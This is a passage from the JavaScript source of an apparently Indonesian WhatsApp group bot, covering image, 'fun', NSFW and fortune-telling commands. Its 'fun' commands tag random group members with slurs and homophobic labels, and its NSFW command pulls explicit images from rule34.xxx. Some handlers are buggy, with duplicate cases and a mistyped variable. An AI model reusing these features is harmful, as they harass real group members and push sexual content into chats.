      if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/deidara.json')
      if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/doraemon.json')
      if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/eba.json')
      if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/elaina.json')
      if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/emilia.json')
      if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/erza.json')
      if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/exo.json')
      if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/femdom.json')
      if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/freefire.json')
      if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gamewallpaper.json')
      if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/glasses.json')
      if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gremory.json')
      if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hekel.json')
      if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hestia.json')
      if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/husbu.json')
      if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/inori.json')
      if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/islamic.json')
      if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/isuzu.json')
      if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itachi.json')
      if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itori.json')
      if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jeni.json')
      if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jiso.json')
      if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/justina.json')
      if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaga.json')
      if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kagura.json')
      if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kakasih.json')
      if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaori.json')
      if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kartun.json')
      if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/katakata.json')
      if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/keneki.json')
      if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kotori.json')
      if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kpop.json')
      if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kucing.json')
      if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kurumi.json')
      if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/lisa.json')
      if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/loli.json')
      if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/madara.json')
      if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/megumin.json')
      if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikasa.json')
      if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikey.json')
      if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/miku.json')
      if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/minato.json')
      if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mobil.json')
      if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/motor.json')
      if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mountain.json')
      if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/naruto.json')
      if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/neko.json')
      if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/neko2.json')
      if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nekonime.json')
      if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nezuko.json')
      if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/onepiece.json')
      if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pentol.json')
      if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pokemon.json')
      if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/profil.json')
      if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/programming.json')
      if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pubg.json')
      if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randblackpink.json')
      if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime.json')
      if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime2.json')
      if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rize.json')
      if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rose.json')
      if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ryujin.json')
      if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sagiri.json')
      if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sakura.json')
      if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sasuke.json')
      if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/satanic.json')
      if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shina.json')
      if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinka.json')
      if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinomiya.json')
      if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shizuka.json')
      if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shota.json')
      if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tatasurya.json')
      if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/technology.json')
      if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tejina.json')
      if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/toukachan.json')
      if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tsunade.json')
      if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/waifu.json')
      if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallhp.json')
      if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallml.json')
      if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallnime.json')
      if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yotsuba.json')
      if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yuki.json')
      if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yulibocil.json')
      if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yumeko.json')
      let yeha = heyy[Math.floor(Math.random() * heyy.length)]
      Hisoka.sendMessage(m.chat, {
        image: {
          url: yeha
        },
        caption: foother,
      }, {
        quoted: m
      })
    }
    break
    
    //============ Fun
    case 'bego':
    case 'goblok':
    case 'janda':
    case 'perawan':
    case 'babi':
    case 'tolol':
    case 'pekok':
    case 'jancok':
    case 'pinter':
    case 'pintar':
    case 'asu':
    case 'bodoh':
    case 'gay':
    case 'lesby':
    case 'bajingan':
    case 'jancok':
    case 'anjing':
    case 'anjg':
    case 'anjj':
    case 'anj':
    case 'ngentod':
    case 'ngentot':
    case 'monyet':
    case 'mastah':
    case 'newbie':
    case 'bangsat':
    case 'bangke':
    case 'sange':
    case 'sangean':
    case 'dakjal':
    case 'horny':
    case 'wibu':
    case 'puki':
    case 'puqi':
    case 'peak':
    case 'pantex':
    case 'pantek':
    case 'setan':
    case 'iblis':
    case 'cacat':
    case 'yatim':
    case 'piatu': {
       if (!isGroup) return reply(mess.group);
      let member = participants.map(u => u.id).filter(v => v !== Hisoka.user.jid)
      let org = member[Math.floor(Math.random() * member.length)];
      Hisoka.sendMessage(m.chat, {
        text: `Anak ${command} di sini adalah @${org.split('@')[0]}`,
        mentions: [org]
      }, {
        quoted: m
      })
    }
    break

case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {

if (!q) return reply(`Usage ${command} Nama\n\nExample : ${command} Lisaa`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`Nama : ${q}\nAnswer : *${sange}%*`)
}

break 
case 'kapankah': {

if (!q) return reply(`Usage ${command} Question\n\nExample : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
m.reply(`Question : ${q}\nAnswer : *${kapankah}*`)
}

break 
case 'cp':
 case 'couple': {
            if (!isGroup) return reply(mess.group);
 let member = participants.map(u => u.id)
 let orang = member[Math.floor(Math.random() * member.length)]
 let jodoh = member[Math.floor(Math.random() * member.length)]
Hisoka.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `hope you are really soulmates >_<`,
"body": `aww ehem`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": thumbnail,
"sourceUrl": ``}}},
{ quoted: m}) 
 }
            break
            case 'gay': {
            if (!isGroup) return reply(mess.group);
 let member = participants.map(u => u.id)
 let orang = member[Math.floor(Math.random() * member.length)]
Hisoka.sendMessage(m.chat,
{ text: `*@${orang.split('@')[0]} Adalah Orang Paling Gay Di Group Ini*`,
contextInfo:{
mentionedJid:[orang],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` Pacar Nya Om Andri`,
"body": `Dia Pernah Duaan Di Hotel`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": thumbnail,
"sourceUrl": ``}}},
{ quoted: m}) 
 }
            break
case 'jodoh':
 case 'jodohku': {
 if (!isGroup) return reply(mess.group);
 let member = participants.map(u => u.id)
 let me = m.sender
 let jodoh = member[Math.floor(Math.random() * member.length)]
Hisoka.sendMessage(m.chat,
{ text: `soulmate of @${me.split('@')[0]} is @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `hope you are really soulmates >_<`,
"body": `aww ehem`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": thumbnail,
"sourceUrl": ``}}},
{ quoted: m}) 
 }
 
break 

// ============Nsfw
    case 'waifu':
    case 'neko':
    case 'shinobu':
    case 'megumin':
    case 'bully':
    case 'cuddle':
    case 'cry':
    case 'hug':
    case 'awoo':
    case 'kiss':
    case 'lick':
    case 'pat':
    case 'smug':
    case 'bonk':
    case 'yeet':
    case 'blush':
    case 'smile':
    case 'wave':
    case 'highfive':
    case 'handhold':
    case 'nom':
    case 'bite':
    case 'glomp':
    case 'slap':
    case 'kill':
    case 'happy':
    case 'wink':
    case 'poke':
    case 'dance':
    case 'cringe':
    case 'trap':
    case 'blowjob':
    case 'hentai':
    case 'boobs':
    case 'ass':
    case 'pussy':
    case 'thighs':
    case 'lesbian':
    case 'lewdneko':
    case 'cum': {
      if (!isOwner && !isPremium) return reply(mess.prem)
      m.reply("Loading 🔁")
      try {
        let haha = await fetchJson(`https://rule34.xxx/index.php?page=dapi&s=post&q=index&tags=${command}&json=1`)
        if (haha && haha[0]?.file_url) {
          let imgUrl = haha[0].file_url
          Hisoka.sendMessage(m.chat, {
            image: {
              url: imgUrl
            },
            caption: foother
          }, {
            quoted: m
          })
        }
      } catch (err) {
        try {
          let atuh = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
          if (atuh.url) {
            Hisoka.sendMessage(m.chat, {
              image: {
                url: atuh.url
              },
              caption: foother
            }, {
              quoted: m
            })
          }
        } catch (err) {
          let sok = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
          if (sok.url) {
            Hisoka.sendMessage(m.chat, {
              image: {
                url: sok.url
              },
              caption: foother
            }, {
              quoted: m
            })
          }
        }
      }
    }
    break
    
    //============ Primbon
    case 'dreammeaning': case 'artimimpi': case 'tafsirmimpi': {
if (!text) return reply(`Example : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Dream :* ${anu.message.mimpi}\n• *Meaning :* ${anu.message.arti}\n• *Solution :* ${anu.message.solusi}`)
}
break
case 'loveforecast': case 'ramalanjodoh': case 'ramaljodoh': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Your Name :* ${anu.message.nama_anda.nama}\n• *Your Birth :* ${anu.message.nama_anda.tgl_lahir}\n• *Partner Name :* ${anu.message.nama_pasangan.nama}\n• *Partner Birth :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Result :* ${anu.message.result}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'balineseloveforecast': case 'ramalanjodohbali': case 'ramaljodohbali': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Your Name :* ${anu.message.nama_anda.nama}\n• *Your Birth :* ${anu.message.nama_anda.tgl_lahir}\n• *Partner Name :* ${anu.message.nama_pasangan.nama}\n• *Partner Birth :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Result :* ${anu.message.result}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'marriagecouple': case 'suamiistri': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Husband Name :* ${anu.message.suami.nama}\n• *Husband Birth :* ${anu.message.suami.tgl_lahir}\n• *Wife Name :* ${anu.message.istri.nama}\n• *Wife Birth :* ${anu.message.istri.tgl_lahir}\n• *Result :* ${anu.message.result}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'lovecompatibility': case 'ramalancinta': case 'ramalcinta': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Your Name :* ${anu.message.nama_anda.nama}\n• *Your Birth :* ${anu.message.nama_anda.tgl_lahir}\n• *Partner Name :* ${anu.message.nama_pasangan.nama}\n• *Partner Birth :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'namemeaning': case 'artinama': {
if (!text) return reply(`Example : ${prefix + command} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Name :* ${anu.message.nama}\n• *Meaning :* ${anu.message.arti}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'namecompatibility': case 'kecocokannama': case 'cocoknama': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Name :* ${anu.message.nama}\n• *Birth :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'couple': case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!text) return reply(`Example : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
Hisoka.sendImage(m.chat,  anu.message.gambar, `• *Your Name :* ${anu.message.nama_anda}\n• *Partner Name :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'relationshipdestiny': case 'jadianpernikahan': case 'jadiannikah': {
if (!text) return reply(`Example : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Wedding Date :* ${anu.message.tanggal}\n• *characteristics :* ${anu.message.characteristics}`)
}
break
case 'businessnature': case 'sifatusaha': {
if (!ext)return reply(`Example : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Birth :* ${anu.message.hari_lahir}\n• *Business :* ${anu.message.usaha}`)
}
break
case 'fortune': case 'rejeki': case 'rezeki': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Birth :* ${anu.message.hari_lahir}\n• *Fortune :* ${anu.message.rejeki}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'career': case 'pekerjaan': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Birth :* ${anu.message.hari_lahir}\n• *Occupation :* ${anu.message.pekerjaan}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'destiny': case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!text) return reply(`Example : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Nature :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Lucky Number :* ${anu.message.angka_keberuntungan}`)
}
break
case 'illness': case 'potensipenyakit': case 'penyakit': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'tarot': case 'artitarot': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
Hisoka.sendImage(m.chat, anu.message.image, `• *Birth :* ${anu.message.tgl_lahir}\n• *Tarot Symbol :* ${anu.message.simbol_tarot}\n• *Meaning :* ${anu.message.arti}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'fengshui': {
if (!text) return `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Name, gender, birth year\nGender : 1 for male & 2 for female`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
reply(`• *Name :* ${anu.message.nama}\n• *Birth :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Kua Number :* ${anu.message.angka_kua}\n• *Group :* ${anu.message.kelompok}\n• *Character :* ${anu.message.karakter}\n• *Good Sector :* ${anu.message.sektor_baik}\n• *Bad Sector :* ${anu.message.sektor_buruk}`)
}
break
case 'goodday': case 'haribaik': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Birth :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'badday': case 'harisangar': case 'taliwangke': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Birth :* ${anu.message.tgl_lahir}\n• *Result :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'unluckyday': case 'harinaas': case 'harisial': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Day Lahir :* ${anu.message.hari_lahir}\n• *Date Lahir :* ${anu.message.tgl_lahir}\n• *Day Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Note :* ${anu.message.info}`)
}
break
case 'dragonday': case 'nagahari': case 'harinaga': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Day Lahir :* ${anu.message.hari_lahir}\n• *Date Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'fortunedirection': case 'arahrejeki': case 'arahrezeki': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Birth Day :* ${anu.message.hari_lahir}\n• *Birth Date :* ${anu.message.tgl_lahir}\n• *Fortune Direction :* ${anu.message.arah_rejeki}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'luck': case 'peruntungan': {
if (!text) return reply(`Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Name, birth date, birth month, birth year, for year`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
reply(`• *Name :* ${anu.message.nama}\n• *Birth :* ${anu.message.tgl_lahir}\n• *Year Fortune :* ${anu.message.peruntungan_tahun}\n• *Result :* ${anu.message.result}\n• *Note :* ${anu.message.catatan}`)
}
break
case 'javanesedate': case 'weton': case 'wetonjawa': {
if (!text) return reply(`Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Date :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'character': case 'sifat': case 'karakter': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Name :* ${anu.message.nama}\n• *Birth :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'luckiness': case 'keberuntungan': {
if (!text) return reply(`Example : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
